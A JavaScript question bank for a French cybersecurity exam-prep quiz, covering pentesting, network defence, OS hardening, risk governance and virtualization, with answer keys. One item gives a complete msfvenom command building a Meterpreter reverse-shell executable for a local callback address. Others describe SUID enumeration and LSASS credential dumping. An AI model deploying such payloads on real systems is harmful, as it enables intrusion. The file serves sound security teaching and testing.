/* Banque de questions — Cap sur le DE */
window.QUIZ_DATA = {
  eh: [
    {
      q: "Qu'est-ce que la reconnaissance passive ?",
      options: [
        "Interagir directement avec la cible pour obtenir des informations",
        "Collecter des informations sans interagir directement avec la cible",
        "Scanner tous les ports de la cible",
        "Exploiter une vulnérabilité pour obtenir un accès"
      ],
      answer: 1,
      explain: "Le passif n'envoie pas de trafic à la cible : OSINT, WHOIS, réseaux sociaux, Shodan. L'actif interagit (Nmap, scan).",
      tag: "Reconnaissance"
    },
    {
      q: "Quelle option Nmap détecte la version des services ?",
      options: ["-O", "-sV", "-sS", "-p-"],
      answer: 1,
      explain: "-sV = version des services. -O = système d'exploitation. -sS = scan SYN. -p- = tous les ports.",
      tag: "Nmap"
    },
    {
      q: "Quelle option Nmap détecte le système d'exploitation ?",
      options: ["-sV", "-O", "-A", "-Pn"],
      answer: 1,
      explain: "-O active l'OS fingerprinting. -A active aussi l'OS, mais avec versions, scripts et traceroute.",
      tag: "Nmap"
    },
    {
      q: "Quelle est la fonction principale de Meterpreter ?",
      options: [
        "Scanner les ports d'un réseau",
        "Fournir un shell en mémoire sur une machine compromise",
        "Générer des certificats TLS",
        "Cracker des hashs de mots de passe"
      ],
      answer: 1,
      explain: "Meterpreter est un payload avancé qui s'exécute en mémoire, chiffre ses communications et fournit un shell interactif.",
      tag: "Metasploit"
    },
    {
      q: "Dans Metasploit, quelle option définit l'adresse IP de la cible ?",
      options: ["set target", "set RHOSTS", "set LHOST", "set PAYLOAD"],
      answer: 1,
      explain: "RHOSTS = cible distante. LHOST = adresse de l'attaquant qui écoute. target n'est pas la commande attendue.",
      tag: "Metasploit"
    },
    {
      q: "Quelle commande génère un payload Windows reverse TCP avec msfvenom ?",
      options: [
        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe",
        "msfvenom -O windows -p 4444",
        "msfconsole -p windows/reverse -o shell.exe",
        "msfvenom -p windows -f tcp -LHOST 4444"
      ],
      answer: 0,
      explain: "La syntaxe est -p payload, LHOST/LPORT, -f format, -o sortie.",
      tag: "Payloads"
    },
    {
      q: "Quelle est la différence entre brute force et attaque par dictionnaire ?",
      options: [
        "Le brute force utilise une liste de mots ; le dictionnaire teste toutes les combinaisons",
        "Le brute force teste toutes les combinaisons ; le dictionnaire utilise une liste de mots",
        "Les deux sont identiques",
        "Le dictionnaire est toujours plus lent"
      ],
      answer: 1,
      explain: "Brute force = espace de combinaisons. Dictionnaire = mots préexistants (rockyou.txt, mots courants, variantes).",
      tag: "Mots de passe"
    },
    {
      q: "Comment Fail2ban protège-t-il un serveur ?",
      options: [
        "Il chiffre les mots de passe",
        "Il bloque automatiquement les IP après un certain nombre d'échecs",
        "Il supprime les comptes faibles",
        "Il limite la bande passante"
      ],
      answer: 1,
      explain: "Fail2ban surveille les logs et bannit les IP après N tentatives échouées. Il ne chiffre rien.",
      tag: "Défenses"
    },
    {
      q: "Quel outil est spécialisé dans l'énumération NetBIOS ?",
      options: ["Legion", "nbtscan", "Nmap", "Nikto"],
      answer: 1,
      explain: "nbtscan scanne les noms NetBIOS, domaines/groupes de travail et adresses MAC. Legion est un framework généraliste.",
      tag: "Énumération"
    },
    {
      q: "Quel outil collecte emails, domaines et IP depuis des sources publiques ?",
      options: ["theHarvester", "Hydra", "Metasploit", "Wireshark"],
      answer: 0,
      explain: "theHarvester interroge des sources publiques (Google, Bing, LinkedIn, Shodan, etc.) pour collecter emails, hôtes et domaines.",
      tag: "OSINT"
    },
    {
      q: "Un Google Dork est-il de la reconnaissance passive ou active ?",
      options: ["Passive", "Active", "Intrusive", "Semi-active"],
      answer: 0,
      explain: "On interroge Google, pas la cible directement : c'est passif.",
      tag: "OSINT"
    },
    {
      q: "Qu'est-ce que le NSE ?",
      options: [
        "Un scanner de vulnérabilités web",
        "Un moteur de scripts Lua intégré à Nmap",
        "Un module de Metasploit",
        "Un protocole de tunneling"
      ],
      answer: 1,
      explain: "Nmap Scripting Engine : scripts Lua pour l'énumération, la détection de vulnérabilités et les tests de configuration.",
      tag: "Nmap"
    },
    {
      q: "Un reverse shell est généralement préféré à un bind shell parce que…",
      options: [
        "Il est plus rapide",
        "Il traverse mieux les NAT et les pare-feux sortants",
        "Il ne nécessite pas de payload",
        "Il est indétectable"
      ],
      answer: 1,
      explain: "La cible initie la connexion vers l'attaquant, ce qui contourne souvent les règles entrantes et le NAT.",
      tag: "Shells"
    },
    {
      q: "Dans l'OWASP Top 10 2021, A03 correspond à :",
      options: ["Broken Access Control", "Injection", "Security Misconfiguration", "SSRF"],
      answer: 1,
      explain: "A01 = Broken Access Control ; A03 = Injection ; A05 = Security Misconfiguration ; A10 = SSRF.",
      tag: "Web"
    },
    {
      q: "Que doit contenir un rapport de pentest ?",
      options: [
        "Uniquement la liste des outils utilisés",
        "Les vulnérabilités, preuves, impact, CVSS et recommandations",
        "Le code source complet de la cible",
        "Les mots de passe de tous les utilisateurs"
      ],
      answer: 1,
      explain: "Le rapport contient synthèse, méthodologie, constats avec preuves et CVSS, impact métier et plan de remédiation.",
      tag: "Rapport"
    }
  ],

  reseau: [
    {
      q: "Qu'est-ce qu'une DMZ ?",
      options: [
        "Un réseau uniquement interne",
        "Une zone isolée entre Internet et le LAN, hébergeant les services exposés",
        "Un type de VPN",
        "Un protocole de routage"
      ],
      answer: 1,
      explain: "La DMZ est une zone tampon, « perdable », qui limite les dégâts si un service exposé est compromis.",
      tag: "DMZ"
    },
    {
      q: "Quel est l'avantage de deux firewalls de marques différentes ?",
      options: [
        "Gestion centralisée et homogénéité",
        "Diversité de défense et absence de faille commune",
        "Moins de règles à écrire",
        "Meilleure performance réseau"
      ],
      answer: 1,
      explain: "La diversité évite qu'une même vulnérabilité affecte les deux équipements. La même marque apporte l'homogénéité.",
      tag: "Firewalls"
    },
    {
      q: "Un firewall avec état (stateful) se distingue car il…",
      options: [
        "Analyse chaque paquet isolément",
        "Maintient une table des connexions et autorise les retours established/related",
        "Chiffre tout le trafic",
        "Remplace un IDS"
      ],
      answer: 1,
      explain: "La table d'état permet de n'autoriser que le retour des connexions légitimes, avec un deny all entrant.",
      tag: "Firewalls"
    },
    {
      q: "Dans un firewall, quelle règle s'applique en premier ?",
      options: [
        "La plus spécifique, toujours",
        "La première règle qui correspond",
        "La dernière règle",
        "La règle la plus récente"
      ],
      answer: 1,
      explain: "Le premier match gagne. Il faut donc ordonner du plus spécifique au plus général et terminer par deny all.",
      tag: "Règles"
    },
    {
      q: "Qu'est-ce que la rupture protocolaire d'un proxy ?",
      options: [
        "Le proxy coupe le réseau",
        "Le proxy termine la connexion client et en ouvre une nouvelle vers le serveur",
        "Le proxy chiffre les mots de passe",
        "Le proxy bloque tout le trafic HTTP"
      ],
      answer: 1,
      explain: "Le proxy est un intermédiaire applicatif : deux connexions distinctes, ce qui permet inspection et filtrage.",
      tag: "Proxy"
    },
    {
      q: "Que protège AH dans IPsec ?",
      options: [
        "La confidentialité uniquement",
        "L'intégrité et l'authentification, sans chiffrement",
        "Le NAT",
        "La disponibilité"
      ],
      answer: 1,
      explain: "AH authentifie et protège l'intégrité, mais ne chiffre pas. ESP ajoute la confidentialité.",
      tag: "IPsec"
    },
    {
      q: "Pourquoi AH est-il incompatible avec NAT ?",
      options: [
        "Il chiffre les ports",
        "Son hash inclut l'en-tête IP, modifié par le NAT",
        "Il utilise UDP 4500",
        "Il ne supporte pas IPv4"
      ],
      answer: 1,
      explain: "Le NAT modifie les adresses IP ; le hash AH ne correspond plus. ESP transport est aussi gêné car les ports sont chiffrés.",
      tag: "IPsec"
    },
    {
      q: "Quel est le rôle de la SPD ?",
      options: [
        "Stocker les clés actives",
        "Définir quel trafic protéger et comment",
        "Gérer les certificats",
        "Compter les paquets"
      ],
      answer: 1,
      explain: "SPD = politique de sécurité. SAD = associations actives (clés, algorithmes, SPI).",
      tag: "IPsec"
    },
    {
      q: "Quelle est la faiblesse principale du WEP ?",
      options: [
        "Il utilise AES",
        "RC4 avec IV de 24 bits, réutilisation et CRC-32 faible",
        "Il impose des certificats",
        "Il est trop récent"
      ],
      answer: 1,
      explain: "Les IV courts sont réutilisés, ce qui permet des attaques statistiques ; CRC-32 ne protège pas l'intégrité.",
      tag: "Wi-Fi"
    },
    {
      q: "WPA2-Enterprise repose sur :",
      options: [
        "Une clé partagée unique",
        "802.1X + RADIUS",
        "WEP + TKIP",
        "Un simple mot de passe Wi-Fi"
      ],
      answer: 1,
      explain: "WPA2-Enterprise authentifie chaque utilisateur via 802.1X et un serveur RADIUS (EAP).",
      tag: "Wi-Fi"
    },
    {
      q: "Quelle affirmation sur PEAP et TTLS est correcte ?",
      options: [
        "PEAP est un standard ouvert plus flexible que TTLS",
        "TTLS est un standard ouvert, flexible, souvent recommandé",
        "Les deux n'utilisent pas de certificat serveur",
        "TTLS ne fonctionne qu'avec Windows"
      ],
      answer: 1,
      explain: "TTLS est ouvert et supporte plusieurs méthodes internes ; PEAP est très intégré à Windows. Les deux exigent un certificat serveur.",
      tag: "Wi-Fi"
    },
    {
      q: "Où placer un IDS en priorité ?",
      options: [
        "Uniquement sur le poste de l'admin",
        "Entre le firewall externe et la DMZ",
        "Dans le cloud uniquement",
        "Sur le serveur de sauvegarde"
      ],
      answer: 1,
      explain: "Il voit les attaques ayant passé FW1 et ciblant les services exposés. On ajoute ensuite un IDS avant le LAN.",
      tag: "IDS/IPS"
    },
    {
      q: "Pourquoi un firewall d'entreprise ne suffit-il pas contre un DDoS ?",
      options: [
        "Il ne sait pas lire les paquets",
        "La bande passante est saturée en amont et ses ressources sont limitées",
        "Il ne fonctionne qu'en IPv6",
        "Il bloque toujours le trafic légitime"
      ],
      answer: 1,
      explain: "Quand le trafic atteint le firewall, la liaison est déjà saturée. La protection doit être amont (FAI, cloud, IXP).",
      tag: "DDoS"
    },
    {
      q: "Où placer un serveur RADIUS pour WPA2-Enterprise ?",
      options: [
        "Directement sur Internet",
        "Dans une zone interne sécurisée/DMZ interne, accessible seulement aux AP",
        "Sur chaque poste client",
        "Dans le routeur d'accès Internet"
      ],
      answer: 1,
      explain: "Le RADIUS est critique : zone interne dédiée, VLAN de management, RadSec/TLS, certificats, accès restreint aux AP.",
      tag: "Wi-Fi"
    }
  ],

  os: [
    {
      q: "Quelle est la permission d'un fichier créé avec umask 0027 ?",
      options: ["0644", "0640", "0600", "0664"],
      answer: 1,
      explain: "666 − 027 = 640 (rw-r-----). Pour un répertoire : 777 − 027 = 750.",
      tag: "Permissions"
    },
    {
      q: "Que fait le bit SUID sur un binaire root ?",
      options: [
        "Il donne au processus l'EUID du propriétaire (root)",
        "Il rend le fichier immuable",
        "Il limite la suppression aux propriétaires",
        "Il chiffre le binaire"
      ],
      answer: 0,
      explain: "Le programme s'exécute avec l'EUID du propriétaire. S'il est vulnérable, un utilisateur peut obtenir root.",
      tag: "SUID"
    },
    {
      q: "Quel bit protège les fichiers dans /tmp ?",
      options: ["SUID", "SGID", "Sticky", "Setcap"],
      answer: 2,
      explain: "Le sticky bit (1777) fait que seul le propriétaire peut supprimer son fichier dans un répertoire world-writable.",
      tag: "Permissions"
    },
    {
      q: "Quelle commande liste les binaires SUID ?",
      options: [
        "find / -perm -4000 -type f",
        "find / -perm -2000 -type f",
        "ls -l /etc/shadow",
        "grep SUID /etc/passwd"
      ],
      answer: 0,
      explain: "-4000 correspond au bit SUID. -2000 correspond au SGID.",
      tag: "SUID"
    },
    {
      q: "Pourquoi la directive use_pty est-elle recommandée avec sudo ?",
      options: [
        "Elle chiffre les commandes",
        "Elle exécute la commande dans un pseudo-terminal et évite les processus en arrière-plan",
        "Elle supprime le mot de passe",
        "Elle donne root sans confirmation"
      ],
      answer: 1,
      explain: "Le pseudo-terminal isole la session et empêche un programme malveillant de survivre après la commande.",
      tag: "Sudo"
    },
    {
      q: "Que permet PAM ?",
      options: [
        "Centraliser l'authentification et appliquer une politique de mot de passe",
        "Compresser les logs",
        "Gérer les partitions",
        "Remplacer le noyau"
      ],
      answer: 0,
      explain: "PAM est une pile de modules d'authentification/session/password, configurable par application.",
      tag: "PAM"
    },
    {
      q: "SELinux est :",
      options: [
        "Un antivirus",
        "Un contrôle d'accès obligatoire (MAC) et une technique de cloisonnement",
        "Un pare-feu",
        "Un système de fichiers"
      ],
      answer: 1,
      explain: "SELinux applique une politique globale (contextes), en plus du DAC Unix. AppArmor est l'alternative par profils.",
      tag: "MAC"
    },
    {
      q: "Que fait kernel.randomize_va_space=2 ?",
      options: [
        "Active l'ASLR complet",
        "Désactive le swap",
        "Active les SYN cookies",
        "Interdit les core dumps"
      ],
      answer: 0,
      explain: "ASLR randomise pile, tas et bibliothèques ; cela complique les exploits mémoire (buffer overflow, ROP).",
      tag: "Sysctl"
    },
    {
      q: "Quel paramètre mitigé les SYN floods ?",
      options: [
        "net.ipv4.tcp_syncookies=1",
        "kernel.sysrq=0",
        "fs.suid_dumpable=0",
        "vm.mmap_min_addr=65536"
      ],
      answer: 0,
      explain: "Les SYN cookies évitent de saturer la table des connexions semi-ouvertes.",
      tag: "Sysctl"
    },
    {
      q: "Quel composant Windows gère les sessions interactives et Ctrl+Alt+Suppr ?",
      options: ["LSASS", "Winlogon", "SRM", "SAM"],
      answer: 1,
      explain: "Winlogon gère l'ouverture/fermeture de session, le verrouillage et la secure attention sequence.",
      tag: "Windows"
    },
    {
      q: "Quel est le rôle de LSASS ?",
      options: [
        "Afficher l'interface de connexion",
        "Authentifier, appliquer la politique locale, créer les tokens et gérer certains secrets",
        "Stocker les fichiers",
        "Gérer le pare-feu"
      ],
      answer: 1,
      explain: "LSASS est central dans l'authentification ; un dump mémoire peut exposer hashs NTLM et tickets Kerberos.",
      tag: "Windows"
    },
    {
      q: "Que fait UAC ?",
      options: [
        "Il supprime les comptes admin",
        "Il permet un token filtré et une élévation à la demande",
        "Il chiffre le disque",
        "Il bloque tous les logiciels"
      ],
      answer: 1,
      explain: "UAC applique le moindre privilège : l'admin travaille avec un token réduit et élève ses droits quand nécessaire.",
      tag: "Windows"
    },
    {
      q: "Credential Guard repose sur :",
      options: [
        "Un simple antivirus",
        "VBS (Virtualization-Based Security) pour isoler les secrets",
        "Le pare-feu Windows",
        "Un fichier hosts"
      ],
      answer: 1,
      explain: "Credential Guard utilise l'hyperviseur/VBS pour isoler LSA et protéger les secrets d'authentification.",
      tag: "Windows"
    },
    {
      q: "EAL4+ est un niveau de :",
      options: [
        "Common Criteria (ISO 15408)",
        "RGPD",
        "PCI-DSS",
        "ISO 22301"
      ],
      answer: 0,
      explain: "EAL = Evaluation Assurance Level, de EAL1 à EAL7. EAL4+ est courant pour les OS grand public.",
      tag: "Certification"
    },
    {
      q: "L'événement Windows 4625 correspond à :",
      options: [
        "Une ouverture de session réussie",
        "Un échec d'ouverture de session",
        "Une création de compte",
        "Un arrêt du système"
      ],
      answer: 1,
      explain: "4625 = échec de logon, à surveiller pour détecter un brute force. 4624 = succès.",
      tag: "Audit"
    }
  ],

  si: [
    {
      q: "Que signifie DICP ?",
      options: [
        "Disponibilité, Intégrité, Confidentialité, Preuve",
        "Détection, Investigation, Containment, Prévention",
        "Données, Identité, Contrôle, Périmètre",
        "Disponibilité, Isolation, Chiffrement, Protection"
      ],
      answer: 0,
      explain: "DICP = Disponibilité, Intégrité, Confidentialité, Preuve/traçabilité.",
      tag: "Fondamentaux"
    },
    {
      q: "Le principe de minimisation RGPD impose :",
      options: [
        "De collecter toutes les données utiles un jour",
        "De ne collecter que les données nécessaires à la finalité",
        "De conserver les données indéfiniment",
        "De partager les données avec les partenaires"
      ],
      answer: 1,
      explain: "Minimisation = adéquation, pertinence et limitation au nécessaire.",
      tag: "RGPD"
    },
    {
      q: "Les données de santé sont :",
      options: [
        "Des données publiques",
        "Des données personnelles sensibles nécessitant une protection renforcée",
        "Des données anonymes",
        "Des données sans régime particulier"
      ],
      answer: 1,
      explain: "Le traitement des données de santé est encadré (exception, AIPD, sécurité renforcée, HDS le cas échéant).",
      tag: "RGPD"
    },
    {
      q: "En cas de violation de données avec risque, la CNIL doit être notifiée sous :",
      options: ["24 h", "48 h", "72 h", "7 jours"],
      answer: 2,
      explain: "Le RGPD impose une notification à la CNIL dans les 72 h. Les personnes sont informées si le risque est élevé.",
      tag: "RGPD"
    },
    {
      q: "Comment calcule-t-on la criticité d'un risque dans une matrice simple ?",
      options: [
        "Vraisemblance + impact",
        "Vraisemblance × impact",
        "Impact − vraisemblance",
        "Nombre d'actifs × coût"
      ],
      answer: 1,
      explain: "On croise vraisemblance et impact (échelles 1–4 par exemple). Le résultat donne une criticité à prioriser.",
      tag: "Risques"
    },
    {
      q: "Une assurance cyber est un traitement de type :",
      options: ["Réduction", "Acceptation", "Transfert", "Évitement"],
      answer: 2,
      explain: "L'assurance transfère une partie du risque financier à un tiers. Elle ne supprime pas le risque.",
      tag: "Risques"
    },
    {
      q: "ISO/IEC 27001 concerne :",
      options: [
        "La continuité d'activité",
        "Les exigences du SMSI",
        "Les tests d'intrusion",
        "La cryptographie"
      ],
      answer: 1,
      explain: "27001 = exigences du Système de Management de la Sécurité de l'Information. 27005 = risques ; 22301 = continuité.",
      tag: "Normes"
    },
    {
      q: "ISO/IEC 27005 est la norme :",
      options: [
        "Des risques liés à la sécurité de l'information",
        "De la qualité",
        "Des réseaux",
        "De la protection physique"
      ],
      answer: 0,
      explain: "27005 fournit les lignes directrices de gestion des risques SSI.",
      tag: "Normes"
    },
    {
      q: "EBIOS RM comporte combien d'ateliers ?",
      options: ["3", "4", "5", "7"],
      answer: 2,
      explain: "Cadrage/socle, sources de risque, scénarios stratégiques, scénarios opérationnels, traitement.",
      tag: "Risques"
    },
    {
      q: "Que signifie IAM ?",
      options: [
        "Identity and Access Management",
        "Internet Access Monitor",
        "Incident Analysis Method",
        "Information Asset Mapping"
      ],
      answer: 0,
      explain: "IAM = gestion des identités et des accès : identification, authentification, autorisation, gouvernance.",
      tag: "IAM"
    },
    {
      q: "LDAPS utilise quel port ?",
      options: ["389", "636", "443", "88"],
      answer: 1,
      explain: "LDAP = 389 ; LDAPS (LDAP sur TLS) = 636. Kerberos = 88.",
      tag: "IAM"
    },
    {
      q: "Quelle est la différence entre PCA et PRA ?",
      options: [
        "Le PCA restaure le SI, le PRA maintient l'activité",
        "Le PCA maintient l'activité en mode dégradé, le PRA restaure le SI",
        "Les deux sont identiques",
        "Le PRA ne concerne que le cloud"
      ],
      answer: 1,
      explain: "PCA = continuité de l'activité ; PRA = reprise/restauration du système d'information.",
      tag: "Continuité"
    },
    {
      q: "Le RTO est :",
      options: [
        "La perte de données maximale acceptable",
        "La durée maximale d'interruption avant restauration",
        "Le coût de la sauvegarde",
        "Le nombre de sites de secours"
      ],
      answer: 1,
      explain: "RTO = Recovery Time Objective (temps de restauration). RPO = perte de données acceptable.",
      tag: "Continuité"
    },
    {
      q: "La règle de sauvegarde 3-2-1 signifie :",
      options: [
        "3 copies, 2 supports, 1 hors site",
        "3 serveurs, 2 clouds, 1 backup",
        "3 jours, 2 semaines, 1 mois",
        "3 utilisateurs, 2 admins, 1 DPO"
      ],
      answer: 0,
      explain: "3 copies, sur 2 types de supports, dont 1 hors site. Ajouter une copie immuable/offline contre le ransomware.",
      tag: "Continuité"
    },
    {
      q: "Dans l'OWASP Top 10, A01 correspond à :",
      options: [
        "Injection",
        "Broken Access Control",
        "Cryptographic Failures",
        "SSRF"
      ],
      answer: 1,
      explain: "A01 = Broken Access Control ; A02 = Cryptographic Failures ; A03 = Injection ; A10 = SSRF.",
      tag: "Web"
    }
  ],

  vs: [
    {
      q: "Quel hyperviseur est de type 1 (bare metal) ?",
      options: ["VirtualBox", "VMware Workstation", "VMware ESXi", "Parallels"],
      answer: 2,
      explain: "ESXi s'installe directement sur le matériel. VirtualBox, Workstation et Parallels sont de type 2.",
      tag: "Hyperviseurs"
    },
    {
      q: "Un hyperviseur de type 2 est :",
      options: [
        "Installé directement sur le matériel",
        "Installé sur un OS hôte existant",
        "Un conteneur Docker",
        "Un stockage réseau"
      ],
      answer: 1,
      explain: "Type 2 = hosted : il dépend d'un OS hôte (Windows, Linux, macOS).",
      tag: "Hyperviseurs"
    },
    {
      q: "Comment appelle-t-on l'OS installé dans une VM ?",
      options: ["Hôte", "Invité (guest)", "Hyperviseur", "VMM"],
      answer: 1,
      explain: "L'hôte est la machine physique ; l'invité est l'OS de la VM.",
      tag: "Vocabulaire"
    },
    {
      q: "Quelle est la principale différence entre une VM et un conteneur ?",
      options: [
        "La VM partage le noyau, le conteneur a un OS complet",
        "Le conteneur partage le noyau de l'hôte, la VM a un OS complet",
        "Le conteneur est plus lourd",
        "La VM ne peut pas être migrée"
      ],
      answer: 1,
      explain: "Le conteneur est léger mais moins isolé ; la VM embarque un OS complet et isole davantage.",
      tag: "Conteneurs"
    },
    {
      q: "À quoi sert un vSwitch ?",
      options: [
        "À stocker les VMDK",
        "À connecter les VM entre elles et au réseau physique",
        "À chiffrer les disques",
        "À gérer les snapshots"
      ],
      answer: 1,
      explain: "Le vSwitch gère les ports, VLAN, uplinks et port groups des VM et du VMkernel.",
      tag: "Réseau"
    },
    {
      q: "En mode bridged, une VM :",
      options: [
        "N'a pas d'accès réseau",
        "Obtient une IP sur le même réseau physique que l'hôte",
        "Est isolée de l'hôte",
        "Utilise uniquement le NAT"
      ],
      answer: 1,
      explain: "Bridged = la VM est sur le LAN physique, avec sa propre IP. NAT = sort via l'hôte. Host-only = hôte ↔ VM seulement.",
      tag: "Réseau"
    },
    {
      q: "Qu'est-ce qu'un NAS ?",
      options: [
        "Un stockage bloc sur réseau dédié",
        "Un stockage fichier accessible via le réseau (NFS/SMB)",
        "Un disque local",
        "Un hyperviseur"
      ],
      answer: 1,
      explain: "NAS = file-level, Ethernet. SAN = block-level, réseau dédié (FC/iSCSI). DAS = directement attaché.",
      tag: "Stockage"
    },
    {
      q: "Qu'est-ce qu'un SAN ?",
      options: [
        "Un stockage fichier via NFS",
        "Un réseau dédié au stockage bloc",
        "Un serveur de messagerie",
        "Un type de snapshot"
      ],
      answer: 1,
      explain: "SAN = Storage Area Network, bloc (FC, iSCSI, FCoE), haute performance.",
      tag: "Stockage"
    },
    {
      q: "VMFS est :",
      options: [
        "Un système de fichiers cluster VMware pour le stockage bloc",
        "Un format d'image Docker",
        "Un protocole de routage",
        "Un type de hyperviseur"
      ],
      answer: 0,
      explain: "VMFS permet à plusieurs hôtes ESXi de partager un datastore bloc. NFS est le datastore fichier.",
      tag: "Stockage"
    },
    {
      q: "vMotion permet de migrer :",
      options: [
        "Les fichiers disque entre datastores",
        "Les CPU/mémoire d'une VM entre hôtes, à chaud",
        "Un conteneur entre registries",
        "Un datastore vers un NAS"
      ],
      answer: 1,
      explain: "vMotion = calcul (CPU/RAM) entre hôtes. Storage vMotion = disque entre datastores.",
      tag: "VMware"
    },
    {
      q: "Un snapshot de VM est :",
      options: [
        "Une sauvegarde complète indépendante",
        "Un point d'état temporaire, pas une sauvegarde",
        "Un template",
        "Un clone physique"
      ],
      answer: 1,
      explain: "Le snapshot dépend du datastore et de la VM ; il faut le consolider et faire de vraies sauvegardes.",
      tag: "VMware"
    },
    {
      q: "Que fait docker run si l'image n'existe pas localement ?",
      options: [
        "Il échoue",
        "Il la télécharge depuis le registre, puis crée et démarre le conteneur",
        "Il crée une VM",
        "Il compile un Dockerfile"
      ],
      answer: 1,
      explain: "Le daemon pull l'image, crée la couche writable, configure réseau/volumes et démarre le processus.",
      tag: "Docker"
    },
    {
      q: "Quelle instruction Dockerfile est obligatoire ?",
      options: ["RUN", "FROM", "EXPOSE", "CMD"],
      answer: 1,
      explain: "FROM définit l'image de base. Sans FROM, pas de construction standard.",
      tag: "Dockerfile"
    },
    {
      q: "Quelle commande démarre les services d'un docker-compose.yml en arrière-plan ?",
      options: [
        "docker compose start",
        "docker compose up -d",
        "docker run compose",
        "docker compose build -d"
      ],
      answer: 1,
      explain: "docker compose up -d crée et démarre les services en mode détaché.",
      tag: "Compose"
    },
    {
      q: "Quelle commande supprime tous les conteneurs, actifs et arrêtés ?",
      options: [
        "docker rm -f $(docker ps -aq)",
        "docker stop $(docker ps -q)",
        "docker rmi -a",
        "docker system info"
      ],
      answer: 0,
      explain: "docker ps -aq liste tous les IDs ; docker rm -f les supprime de force. docker system prune -a nettoie aussi images/réseaux inutilisés.",
      tag: "Docker"
    }
  ]
};
